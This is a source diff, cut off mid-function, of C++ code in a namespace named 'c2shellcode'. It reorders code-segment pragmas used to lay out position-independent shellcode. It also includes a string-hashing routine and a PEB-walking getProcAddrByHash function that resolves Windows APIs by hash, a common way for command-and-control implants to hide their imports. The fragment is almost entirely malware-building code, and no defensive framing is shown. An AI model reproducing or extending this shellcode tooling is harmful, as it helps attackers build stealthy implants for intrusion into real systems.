@@ -2,15 +2,11 @@
 
 namespace c2shellcode {
 
-#pragma code_seg(push, ".textex$0001")
-	void BeginShellcode() {}
-#pragma code_seg(pop)
-
-#pragma code_seg(push, ".textex$1111")
+#pragma code_seg(push, ".textex$ffff")
 	void EndShellcode() {}
 #pragma code_seg(pop)
 
-#pragma code_seg(push, ".textex$0002")
+#pragma code_seg(push, ".textex$fffe")
 	DWORD rt_hash(const char* str) {
 		DWORD h = 0;
 		while (*str) {
@@ -20,16 +16,12 @@ namespace c2shellcode {
 		}
 		return h;
 	}
-#pragma code_seg(pop)
 
-#pragma code_seg(push, ".textex$0003")
 	LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr) {
 		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 		return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
 	}
-#pragma code_seg(pop)
 
-#pragma code_seg(push, ".textex$0004")
 	PVOID getProcAddrByHash(DWORD hash) {
 		PEB* peb = getPEB();
 		LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
